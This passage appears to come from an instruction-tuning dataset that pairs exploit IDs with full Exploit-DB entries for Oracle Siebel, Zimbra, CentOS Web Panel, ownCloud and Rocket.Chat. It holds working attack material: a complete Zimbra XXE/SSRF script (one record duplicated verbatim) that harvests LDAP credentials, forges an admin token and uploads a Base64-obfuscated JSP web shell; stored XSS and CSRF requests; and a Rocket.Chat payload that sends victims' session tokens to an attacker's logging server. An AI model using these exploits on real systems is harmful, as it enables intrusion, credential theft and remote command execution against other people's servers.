            "Date Added": "2019-12-09",
            "Date Updated": "2019-12-09",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title : Oracle Siebel Sales 8.1 - Persistent Cross-Site Scripting\n# Exploit Author : omurugur\n# Software link: https://www.oracle.com/tr/applications/siebel/\n# Effective version : Oracle Siebel Sales 8.1\n# CVE: N/A\n\n# Examples Request;\n\nPOST /salesADMIN_trk/start.swe HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64;\nTrident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729;\n.NET CLR 3.5.30729)\nHost: X.X.X.X\nContent-Length: 550\nPragma: no-cache\nCookie: SWEUAID=23; _sn=**-yVfB7JyKox4txS.fQJdh6us-fIdUQaQW0.oxIhK\nConnection: close\n\ns_1_1_26_0=&SWEVI=&SWERowId=1-5VWLXT4&SWEC=39&s_1_1_28_0=&SWEMethod=PostChanges&s_1_1_18_0=12/9/2019&SWEPOC=Account&SWEReqRowId=1&SWERPC=1&s_1_1_90_0=N&s_1_1_71_0=&s_1_1_72_0=&s_1_1_83_0=<IFRAME\nSRC=\"javascript:alert('XSS');\"></IFRAME>&SWEApplet=Revenue%20Analysis%20Form%20Applet&SWEActiveApplet=Revenue%20Analysis%20Form%20Applet&s_1_1_51_0=%240.00&SWEView=Revenue%20Analysis%20View&SWECmd=InvokeMethod&s_1_1_65_0=&s_1_1_21_0=%240.00&s_1_1_55_0=SADMIN&SWETS=1575878518105&SWEActiveView=Revenue%20Analysis%20View&s_1_1_89_0=&s_1_1_78_0=%240.00&SWEP=&s_1_1_36_0=N&s_1_1_14_0=0.000000&SWERowIds="
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46967",
        "output": {
            "ID": "46967",
            "File": "exploits/jsp/webapps/46967.py",
            "Description": "Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery",
            "Date Published": "2019-06-05",
            "Author": "k8gege",
            "Type": "webapps",
            "Platform": "jsp",
            "Port": "",
            "Date Added": "2019-06-05",
            "Date Updated": "2019-06-05",
            "Verified": "0",
            "Codes": [
                "CVE-2019-9621"
            ],
            "Tags": [
                "XML External Entity (XXE)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#coding=utf8\nimport requests\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nbase_url=sys.argv[1]\nbase_url=base_url.rstrip(\"/\")\n#upload file name and content\n#modify by k8gege\n#Connect \"shell.jsp\" using K8fly CmdShell\n#Because the CMD parameter is encrypted using Base64(bypass WAF)\nfilename = \"shell.jsp\"\nfileContent = r'<%@page import=\"java.io.*\"%><%@page import=\"sun.misc.BASE64Decoder\"%><%try {String cmd = request.getParameter(\"tom\");String path=application.getRealPath(request.getRequestURI());String dir=\"weblogic\";if(cmd.equals(\"NzU1Ng\")){out.print(\"[S]\"+dir+\"[E]\");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(\"->|\");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print(\"|<-\");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%>'\nprint(base_url)\n#dtd file url\ndtd_url=\"https://k8gege.github.io/zimbra.dtd\"\n\"\"\"\n<!ENTITY % file SYSTEM \"file:../conf/localconfig.xml\">\n<!ENTITY % start \"<![CDATA[\">\n<!ENTITY % end \"]]>\">\n<!ENTITY % all \"<!ENTITY fileContents '%start;%file;%end;'>\">\n\"\"\"\nxxe_data = r\"\"\"<!DOCTYPE Autodiscover [\n        <!ENTITY % dtd SYSTEM \"{dtd}\">\n        %dtd;\n        %all;\n        ]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n    <Request>\n        <EMailAddress>aaaaa</EMailAddress>\n        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>\n    </Request>\n</Autodiscover>\"\"\".format(dtd=dtd_url)\n\n#XXE stage\nheaders = {\n    \"Content-Type\":\"application/xml\"\n}\nprint(\"[*] Get User Name/Password By XXE \")\nr = requests.post(base_url+\"/Autodiscover/Autodiscover.xml\",data=xxe_data,headers=headers,verify=False,timeout=15)\n#print r.text\nif 'response schema not available' not in r.text:\n    print(\"have no xxe\")\n    exit()\n\n#low_token Stage\nimport re\npattern_name = re.compile(r\"<key name=(\\\"|\")zimbra_user(\\\"|\")>\\n.*?<value>(.*?)<\\/value>\")\npattern_password = re.compile(r\"<key name=(\\\"|\")zimbra_ldap_password(\\\"|\")>\\n.*?<value>(.*?)<\\/value>\")\nusername = pattern_name.findall(r.text)[0][2]\npassword = pattern_password.findall(r.text)[0][2]\nprint(username)\nprint(password)\n\nauth_body=\"\"\"<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n   <soap:Header>\n       <context xmlns=\"urn:zimbra\">\n           <userAgent name=\"ZimbraWebClient - SAF3 (Win)\" version=\"5.0.15_GA_2851.RHEL5_64\"/>\n       </context>\n   </soap:Header>\n   <soap:Body>\n     <AuthRequest xmlns=\"{xmlns}\">\n        <account by=\"adminName\">{username}</account>\n        <password>{password}</password>\n     </AuthRequest>\n   </soap:Body>\n</soap:Envelope>\n\"\"\"\nprint(\"[*] Get Low Privilege Auth Token\")\nr=requests.post(base_url+\"/service/soap\",data=auth_body.format(xmlns=\"urn:zimbraAccount\",username=username,password=password),verify=False)\n\npattern_auth_token=re.compile(r\"<authToken>(.*?)</authToken>\")\n\nlow_priv_token = pattern_auth_token.findall(r.text)[0]\n\n#print(low_priv_token)\n\n# SSRF+Get Admin_Token Stage\n\nheaders[\"Cookie\"]=\"ZM_ADMIN_AUTH_TOKEN=\"+low_priv_token+\";\"\nheaders[\"Host\"]=\"foo:7071\"\nprint(\"[*] Get Admin  Auth Token By SSRF\")\nr = requests.post(base_url+\"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap\",data=auth_body.format(xmlns=\"urn:zimbraAdmin\",username=username,password=password),headers=headers,verify=False)\n\nadmin_token =pattern_auth_token.findall(r.text)[0]\n#print(\"ADMIN_TOKEN:\"+admin_token)\n\nf = {\n    'filename1':(None,\"whocare\",None),\n    'clientFile':(filename,fileContent,\"text/plain\"),\n    'requestId':(None,\"12\",None),\n}\n\nheaders ={\n    \"Cookie\":\"ZM_ADMIN_AUTH_TOKEN=\"+admin_token+\";\"\n}\nprint(\"[*] Uploading file\")\nr = requests.post(base_url+\"/service/extension/clientUploader/upload\",files=f,headers=headers,verify=False)\n#print(r.text)\nprint(\"Shell: \"+base_url+\"/downloads/\"+filename)\n#print(\"Connect \\\"shell.jsp\\\" using K8fly CmdShell\\nBecause the CMD parameter is encrypted using Base64(bypass WAF)\")\nprint(\"[*] Request Result:\")\ns = requests.session()\nr = s.get(base_url+\"/downloads/\"+filename,verify=False,headers=headers)\n#print(r.text)\nprint(\"May need cookie:\")\nprint(headers['Cookie'])"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46967",
        "output": {
            "ID": "46967",
            "File": "exploits/jsp/webapps/46967.py",
            "Description": "Zimbra < 8.8.11 - XML External Entity Injection / Server-Side Request Forgery",
            "Date Published": "2019-06-05",
            "Author": "k8gege",
            "Type": "webapps",
            "Platform": "jsp",
            "Port": "",
            "Date Added": "2019-06-05",
            "Date Updated": "2019-06-05",
            "Verified": "0",
            "Codes": [
                "CVE-2019-9621"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#coding=utf8\nimport requests\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nbase_url=sys.argv[1]\nbase_url=base_url.rstrip(\"/\")\n#upload file name and content\n#modify by k8gege\n#Connect \"shell.jsp\" using K8fly CmdShell\n#Because the CMD parameter is encrypted using Base64(bypass WAF)\nfilename = \"shell.jsp\"\nfileContent = r'<%@page import=\"java.io.*\"%><%@page import=\"sun.misc.BASE64Decoder\"%><%try {String cmd = request.getParameter(\"tom\");String path=application.getRealPath(request.getRequestURI());String dir=\"weblogic\";if(cmd.equals(\"NzU1Ng\")){out.print(\"[S]\"+dir+\"[E]\");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(\"->|\");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print(\"|<-\");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%>'\nprint(base_url)\n#dtd file url\ndtd_url=\"https://k8gege.github.io/zimbra.dtd\"\n\"\"\"\n<!ENTITY % file SYSTEM \"file:../conf/localconfig.xml\">\n<!ENTITY % start \"<![CDATA[\">\n<!ENTITY % end \"]]>\">\n<!ENTITY % all \"<!ENTITY fileContents '%start;%file;%end;'>\">\n\"\"\"\nxxe_data = r\"\"\"<!DOCTYPE Autodiscover [\n        <!ENTITY % dtd SYSTEM \"{dtd}\">\n        %dtd;\n        %all;\n        ]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n    <Request>\n        <EMailAddress>aaaaa</EMailAddress>\n        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>\n    </Request>\n</Autodiscover>\"\"\".format(dtd=dtd_url)\n\n#XXE stage\nheaders = {\n    \"Content-Type\":\"application/xml\"\n}\nprint(\"[*] Get User Name/Password By XXE \")\nr = requests.post(base_url+\"/Autodiscover/Autodiscover.xml\",data=xxe_data,headers=headers,verify=False,timeout=15)\n#print r.text\nif 'response schema not available' not in r.text:\n    print(\"have no xxe\")\n    exit()\n\n#low_token Stage\nimport re\npattern_name = re.compile(r\"<key name=(\\\"|\")zimbra_user(\\\"|\")>\\n.*?<value>(.*?)<\\/value>\")\npattern_password = re.compile(r\"<key name=(\\\"|\")zimbra_ldap_password(\\\"|\")>\\n.*?<value>(.*?)<\\/value>\")\nusername = pattern_name.findall(r.text)[0][2]\npassword = pattern_password.findall(r.text)[0][2]\nprint(username)\nprint(password)\n\nauth_body=\"\"\"<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n   <soap:Header>\n       <context xmlns=\"urn:zimbra\">\n           <userAgent name=\"ZimbraWebClient - SAF3 (Win)\" version=\"5.0.15_GA_2851.RHEL5_64\"/>\n       </context>\n   </soap:Header>\n   <soap:Body>\n     <AuthRequest xmlns=\"{xmlns}\">\n        <account by=\"adminName\">{username}</account>\n        <password>{password}</password>\n     </AuthRequest>\n   </soap:Body>\n</soap:Envelope>\n\"\"\"\nprint(\"[*] Get Low Privilege Auth Token\")\nr=requests.post(base_url+\"/service/soap\",data=auth_body.format(xmlns=\"urn:zimbraAccount\",username=username,password=password),verify=False)\n\npattern_auth_token=re.compile(r\"<authToken>(.*?)</authToken>\")\n\nlow_priv_token = pattern_auth_token.findall(r.text)[0]\n\n#print(low_priv_token)\n\n# SSRF+Get Admin_Token Stage\n\nheaders[\"Cookie\"]=\"ZM_ADMIN_AUTH_TOKEN=\"+low_priv_token+\";\"\nheaders[\"Host\"]=\"foo:7071\"\nprint(\"[*] Get Admin  Auth Token By SSRF\")\nr = requests.post(base_url+\"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap\",data=auth_body.format(xmlns=\"urn:zimbraAdmin\",username=username,password=password),headers=headers,verify=False)\n\nadmin_token =pattern_auth_token.findall(r.text)[0]\n#print(\"ADMIN_TOKEN:\"+admin_token)\n\nf = {\n    'filename1':(None,\"whocare\",None),\n    'clientFile':(filename,fileContent,\"text/plain\"),\n    'requestId':(None,\"12\",None),\n}\n\nheaders ={\n    \"Cookie\":\"ZM_ADMIN_AUTH_TOKEN=\"+admin_token+\";\"\n}\nprint(\"[*] Uploading file\")\nr = requests.post(base_url+\"/service/extension/clientUploader/upload\",files=f,headers=headers,verify=False)\n#print(r.text)\nprint(\"Shell: \"+base_url+\"/downloads/\"+filename)\n#print(\"Connect \\\"shell.jsp\\\" using K8fly CmdShell\\nBecause the CMD parameter is encrypted using Base64(bypass WAF)\")\nprint(\"[*] Request Result:\")\ns = requests.session()\nr = s.get(base_url+\"/downloads/\"+filename,verify=False,headers=headers)\n#print(r.text)\nprint(\"May need cookie:\")\nprint(headers['Cookie'])"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47123",
        "output": {
            "ID": "47123",
            "File": "exploits/linux/webapps/47123.txt",
            "Description": "CentOS Control Web Panel 0.9.8.836 - Authentication Bypass",
            "Date Published": "2019-07-16",
            "Author": "Pongtorn Angsuchotmetee",
            "Type": "webapps",
            "Platform": "linux",
            "Port": "",
            "Date Added": "2019-07-16",
            "Date Updated": "2019-07-16",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13605;CVE-2019-13360"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: CWP (CentOS Control Web Panel) < 0.9.8.847 Bypass Login\n# Date: 6 July 2019\n# Exploit Author: Pongtorn Angsuchotmetee\n# Vendor Homepage: https://control-webpanel.com/changelog\n# Software Link: Not available, user panel only available for latest version\n# Version: 0.9.8.836 to 0.9.8.846\n# Tested on: CentOS 7.6.1810 (Core)\n# CVE : CVE-2019-13360, CVE-2019-13605\n\n# ====================================================================\n# Information\n# ====================================================================\n\nProduct             : CWP Control Web Panel\nVulnerability Name  : User panel bypass Login\nversion             : 0.9.8.836\nFixed on            : 0.9.8.848\nTest on             : CentOS 7.6.1810 (Core)\nReference           : http://centos-webpanel.com/\n                    : https://control-webpanel.com/changelog\nCVE-Number          : CVE-2019-13605\n\n\n# ====================================================================\n# Root course of the vulnerability\n# ====================================================================\nAfter login success, the application will retuens base64 value and use it to authenticate again,\nThat allow attacker to modify the response and become a user\n\n# ====================================================================\n# Response format (version 0.9.8.836 to 0.9.8.837)\n# ====================================================================\n\n<username>||/<username>/theme/original\n\n\n\n# CVE-2019-13360\n# ====================================================================\n# Steps to Reproduce Version 0.9.8.836 to 0.9.8.837\n# ====================================================================\n\n1. Login with valid username and invalid password\n2. Replace the target username in \"<username>||/<username>/theme/original\"\n3. Convert to base64\n4. Place the base64 value to HTTP response body\n5. Gain access to user area\n\n\n# CVE-2019-13605\n# ====================================================================\n# Steps to Reproduce Version 0.9.8.838 to 0.9.8.846\n# ====================================================================\n\n1. Create a testing environment\n\t1.1 Create user as a target username\n\t1.2 Login as the user\n\t1.3 Save the HTTP response body (token value)\n2. Login to the real target with valid username and invalid password\n3. Place the value we saved from step 1.3 in HTTP response body\n4. Gain access to user area\n\n*The response value format is depends on version, just replace the hole value\n\n\n\n# ====================================================================\n# PoC\n# ====================================================================\nhttps://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE/blob/master/CVE-2019-13360.md\nhttps://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE/blob/master/CVE-2019-13605.md\n\n\n\n# ====================================================================\n# Timeline\n# ====================================================================\n2019-07-07: Discovered the bug\n2019-07-07: Reported to vendor\n2019-07-07: Vender accepted the vulnerability\n2019-07-11: The vulnerability has been fixed\n2019-07-15: Advisory published\n\n\n\n# ====================================================================\n# Discovered by\n# ====================================================================\nPongtorn Angsuchotmetee"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47571",
        "output": {
            "ID": "47571",
            "File": "exploits/linux/webapps/47571.txt",
            "Description": "ownCloud 10.3.0 stable - Cross-Site Request Forgery",
            "Date Published": "2019-11-01",
            "Author": "Ozer Goker",
            "Type": "webapps",
            "Platform": "linux",
            "Port": "",
            "Date Added": "2019-11-01",
            "Date Updated": "2019-11-01",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: ownCloud 10.3.0 stable - Cross-Site Request Forgery\n# Date: 2019-10-31\n# Exploit Author: Ozer Goker\n# Vendor Homepage: https://owncloud.org\n# Software Link: https://owncloud.org/download/\n# Version: 10.3\n# CVE: N/A\n\n# Introduction\n# Your personal cloud collaboration platform With over 50 million users\n# worldwide, ownCloud is the market-leading open source software for\n# cloud-based collaboration platforms. As an alternative to Dropbox, OneDrive\n# and Google Drive, ownCloud offers real data security and privacy for you\n# and your data.\n\n##################################################################################################################################\n\n# CSRF1\n# Create Folder\n\nMKCOL /remote.php/dav/files/user/test HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nrequesttoken:\nVREONXtUByUsCkMAcRscHjUGHjYGPBoHJQgsfzoHWEk=:fUCe0mdAzn0T3MNKlKqYMEBFcezMTukbmbVeDs+jKlo=\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\n\n##################################################################################################################################\n\n# CSRF2\n# Delete Folder\n\nDELETE /remote.php/dav/files/user/test HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nrequesttoken:\nHDQcAi5jLSkkKysEGiYxZSA7PhcaCWEYFydhQ106YEM=:/pQReZNMrOXPXpc0yvQxQp9YQJ7q3HShA9D2+R2EJuI=\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\n\n##################################################################################################################################\n\n# CSRF3\n# Create User\n\nPOST /index.php/settings/users/users HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\neRIlHRIBJF0jU1w9CSY+AT8CX18gTh90JV8UQwQdfEg=:JVhMY8G9u7/iKplTfO00k7G5c2BqjoOcCWkAHYdZV5I=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 39\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\nusername=test&password=&email=test@test\n\n\n\n##################################################################################################################################\n\n# CSRF4\n# Delete User\n\nDELETE /index.php/settings/users/users/test HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nrequesttoken:\nBQ8vIjp9LjACFxwEB2QkMSsuG14kHy4SKio6URckUlk=:6KbrqDMTTsoPE2vdrct1ofvSlGlcyVarSAOFV9PFuLQ=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\n\n##################################################################################################################################\n\n# CSRF5\n# Create Group\n\nPOST /index.php/settings/users/groups HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\nBRd8ZDsAFREkB0YxdAIaYi8/ABsyCBIDExs/Wgw9a28=:6S14p9vurc5e6TH7vrotyqJBUvihbOXDUWMKYbS23UU=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 7\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\nid=test\n\n\n##################################################################################################################################\n\n# CSRF6\n# Delete Group\n\nDELETE /index.php/settings/users/groups/test HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nrequesttoken:\naTElBwBqTAUYEEQacjdgER4hJ0QIA20sdF00CwtHUm0=:ZuhWKS/aNt7N0a2DGlH+Cz5m20b9e5aFOSBKkqJOALw=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\n\n##################################################################################################################################\n\n# CSRF7\n# Change User Full Name\n\nPOST /index.php/settings/users/user/displayName HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\nfzYYPjtaVBUeKj8CBzojJHIgXTkTTT4GbR0vBT4TCm0=:LrUnpc7qHNLVElqq+m2VX4fG+py7Pa9FK8DpB84dSdY=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 37\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\ndisplayName=user1&oldDisplayName=user\n\n\n##################################################################################################################################\n\n# CSRF8\n# Change User Email\n\nPUT /index.php/settings/users/user/mailAddress HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\nQAkuGRpIMg88IzsXBTMeYREpCA4zLhcQHiMsQBo7WWo=:sMcIQqQkjGHCGeL4HdgaxWOQXNzrtIjAou6akezvpcI=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 31\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\nmailAddress=user1%40example.com\n\n\n##################################################################################################################################\n\n# CSRF9\n# Change User Password\n\n\nPOST /index.php/settings/personal/changepassword HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\nfwkfaH9zECcMJR4CFS8EZSF5NhseCwkYciMXeVclBB4=:LMR84JsCZAmVWyV0x4YtUrQY4NAK9W75wnR46WsbXbU=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 62\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\noldpassword=1234&personal-password=1&personal-password-clone=1\n\n\n##################################################################################################################################\n\n# CSRF10\n# Change Language\n\nPOST /index.php/settings/ajax/setlanguage.php HTTP/1.1\nHost: 192.168.2.111\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)\nGecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken:\nfwkfaH9zECcMJR4CFS8EZSF5NhseCwkYciMXeVclBB4=:LMR84JsCZAmVWyV0x4YtUrQY4NAK9W75wnR46WsbXbU=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 7\nOrigin: http://192.168.2.111\nDNT: 1\nConnection: close\nCookie:\noc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;\nocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k\n\nlang=tr\n\n\n##################################################################################################################################"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47537",
        "output": {
            "ID": "47537",
            "File": "exploits/linux/webapps/47537.txt",
            "Description": "Rocket.Chat 2.1.0 - Cross-Site Scripting",
            "Date Published": "2019-10-23",
            "Author": "3H34N",
            "Type": "webapps",
            "Platform": "linux",
            "Port": "",
            "Date Added": "2019-10-23",
            "Date Updated": "2019-10-25",
            "Verified": "0",
            "Codes": [
                "CVE-2019-17220"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Title: Rocket.Chat 2.1.0 - Cross-Site Scripting\n# Author: 3H34N\n# Date: 2019-10-22\n# Product: Rocket.Chat\n# Vendor: https://rocket.chat/\n# Vulnerable Version(s): Rocket.Chat < 2.1.0\n# CVE: CVE-2019-17220\n# Special Thanks : Ali razmjoo, Mohammad Reza Espargham (@rezesp)\n\n# PoC\n# 1. Create l33t.php on a web server\n\n<?php\n$output = fopen(\"logs.txt\", \"a+\") or die(\"WTF? o.O\");\n$leet = $_GET['leet'].\"\\n\\n\";\nfwrite($output, $leet);\nfclose($output);\n?>\n\n# 2. Open a chat session\n# 3. Send payload with your web server url\n\n![title](http://10.10.1.5/l33t.php?leet=+`{}token`)\n\n# 4. Token will be written in logs.txt when target seen your message."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46820",
        "output": {
            "ID": "46820",
